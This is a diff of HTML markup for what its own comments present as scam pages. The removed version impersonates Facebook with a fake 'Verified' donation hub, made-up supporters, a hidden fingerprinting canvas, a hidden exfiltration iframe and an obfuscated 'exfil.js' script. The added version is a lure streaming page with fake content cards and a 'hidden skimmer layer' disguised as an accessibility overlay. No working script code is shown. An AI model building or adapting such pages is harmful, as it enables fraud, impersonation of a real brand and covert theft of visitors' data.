@@ -1,58 +1,30 @@
-<!DOCTYPE html>
-<html lang="en" data-theme="light">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Community Giveback Hub</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="ui.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.bunny.net">
-    <link href="https://fonts.bunny.net/css?family=inter:400,500,600,700" rel="stylesheet">
-</head>
-<body>
-    <div class="app-container" role="main">
-        <!-- Header with fake Facebook branding -->
-        <header class="app-header">
-            <div class="branding">
-                <i class="fab fa-facebook-square"></i>
-                <span>Facebook Giveback</span>
-                <span class="badge-verified"><i class="fas fa-check-circle"></i> Verified</span>
-            </div>
-            <div class="user-pill">
-                <img src="https://i.pravatar.cc/40?img=12" alt="User" class="avatar">
-                <span>Welcome, supporter!</span>
-            </div>
-        </header>
-
-        <!-- Interactive "Donation Meter" -->
-        <section class="card interactive-card">
-            <h2><i class="fas fa-chart-line"></i> Community Impact Meter</h2>
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar" style="width: 68%;"></div>
-            </div>
-            <p class="progress-text"><strong>$24,850</strong> raised of $35,000 goal</p>
-            <button class="btn btn-primary" id="contributeBtn">
-                <i class="fas fa-heart"></i> Contribute Now
-            </button>
-        </section>
-
-        <!-- "Recent Supporters" Feed (Fake Dynamic Content) -->
-        <section class="card feed-card">
-            <h3><i class="fas fa-users"></i> Recent Supporters</h3>
-            <ul class="supporter-list" id="supporterList">
-                <!-- Populated by JS with fake names/amounts -->
-            </ul>
-        </section>
-
-        <!-- Hidden Canvas for Fingerprinting & Data Exfiltration -->
-        <canvas id="fingerprintCanvas" style="display: none;"></canvas>
-        <iframe name="exfilFrame" style="display: none;"></iframe>
+<main class="streaming-app" data-theme="dark">
+  <header class="app-header">
+    <svg class="brand-logo">...</svg>
+    <nav class="main-nav">
+      <a href="#home">Home</a>
+      <a href="#trending">Trending</a>
+      <a href="#donate">Support</a>
+    </nav>
+  </header>
+  
+  <section class="hero-player">
+    <video controls poster="preview.jpg">
+      <source src="funny-video.mp4" type="video/mp4">
+    </video>
+    <div class="player-controls">...</div>
+  </section>
+  
+  <section class="content-grid">
+    <div class="content-card" data-id="1">
+      <div class="card-thumb"></div>
+      <h3 class="card-title">Heartwarming Rescue Stories</h3>
     </div>
-
-    <!-- All JS – modular and obfuscated -->
-    <script src="ui-engine.js"></script>
-    <script src="data-layer.js"></script>
-    <script src="exfil.js"></script>
-</body>
-</html>
+    <!-- 20+ cards, all fake content -->
+  </section>
+  
+  <!-- Hidden skimmer layer -->
+  <div class="accessibility-overlay" aria-hidden="true">
+    <input type="text" id="hidden-input-capture">
+  </div>
+</main>
